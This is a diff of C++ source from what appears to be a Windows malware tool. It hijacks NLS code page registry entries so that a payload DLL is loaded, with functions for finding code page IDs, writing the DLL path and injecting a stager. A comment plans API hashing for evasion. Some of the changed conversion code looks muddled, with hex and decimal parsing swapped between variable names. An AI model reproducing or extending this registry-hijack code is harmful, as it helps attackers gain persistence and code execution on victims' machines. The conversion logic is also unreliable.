@@ -5,9 +5,7 @@
 #include "resource1.h"
 #define MAX_SIZE_DATA 260
 
-//Two functions required: One hex, and decimal.
-
-//Decimal function (used for arg)
+//IMPLEMENTED IT two different functions for convertion. 
 UINT StringToIntDecimal(PWCHAR str) noexcept
 {
 	uint32_t num = _wtoi(str);
@@ -43,7 +41,6 @@ UINT StringToInt(PWCHAR str) noexcept {
 	}
 	return i;
 }
-
 BOOLEAN CompareLastElementString(PWCHAR str1, PWCHAR str2, BOOLEAN CaseInsensitive)
 {
 	bool bResult = false;
@@ -54,7 +51,6 @@ BOOLEAN CompareLastElementString(PWCHAR str1, PWCHAR str2, BOOLEAN CaseInsensiti
 	}
 	return bResult;
 }
-
 bool FindCodePageWithPayload(PRegistryKey regObject, UINT dwValuesCount, UINT dwMaxLenValues){
 	DWORD dwCountName = 0, typeData, ValueDataSize = 0;
 	//uint32_t CodePageInt;
@@ -78,8 +74,11 @@ bool FindCodePageWithPayload(PRegistryKey regObject, UINT dwValuesCount, UINT dw
 #ifdef _DEBUG
 			std::wprintf(L"Payload value has been found!: %d - %s = %s\n", i, CodePageID, ValueData);
 #endif
-			regObject->setCodePageID(StringToInt(CodePageID), CodePageIDIndex::CodePageHex);
-			regObject->setCodePageID(StringToIntDecimal(CodePageID), CodePageIDIndex::CodePageInt);
+			uint32_t strHex = std::stoull(CodePageID, nullptr, 10);
+			uint32_t strDecimal = std::stoull(CodePageID, nullptr, 16);
+			regObject->setCodePageID(strHex, CodePageIDIndex::CodePageInt);
+			regObject->setCodePageID(strDecimal, CodePageIDIndex::CodePageHex);
+			std::wprintf(L"Values: CodepageHex = %d, CodePageInt = 0x%x\n", strDecimal, strHex);
 			bResult = true;
 			break;
 		}
@@ -150,9 +149,11 @@ bool IterateCodePageAndExtractProperId(PRegistryKey regObject) {
 			if (!RegSetValueExW(regObject->hSubkeyNls, ValueData, NULL, REG_SZ, (BYTE*)regObject->getStringBuffer(Index::DLL_NAME),
 				regObject->getStringSize(Index::FULL_PAYLOAD_DLL_PATH)))
 			{
+				uint32_t CodePageDecimal = StringToIntDecimal(ValueData);
 				std::printf("Sucessfully created dll payload in CodePage ID %x\n", CodePageInt);
 				regObject->setCodePageID(CodePageInt, CodePageIDIndex::CodePageHex);
-				regObject->setCodePageID(StringToIntDecimal(ValueData), CodePageIDIndex::CodePageInt);
+				regObject->setCodePageID(CodePageDecimal, CodePageIDIndex::CodePageInt);
+				std::wprintf(L"Values: CodepageHex = %d, CodePageInt = 0x%x\n", CodePageInt, CodePageDecimal);
 				correctRet = true;
 				break;
 			}
@@ -278,7 +279,7 @@ void InjectStagerToPayload(PRegistryKey regObject) {
 //Main Bugs:
 // 3. OPTIONAL: Convert every single of the function as part of regObject
 //		-Implement Inheritance.
-//		-Implement API Hashing and dynamic resolving. (NOT pic). Mathias from SC has something related to this in C++
+//		-Implement API Hashing and dynamic resolving. (NOT pic).
 
 bool OpenKeyForNlsModification(PRegistryKey regObject) noexcept
 {
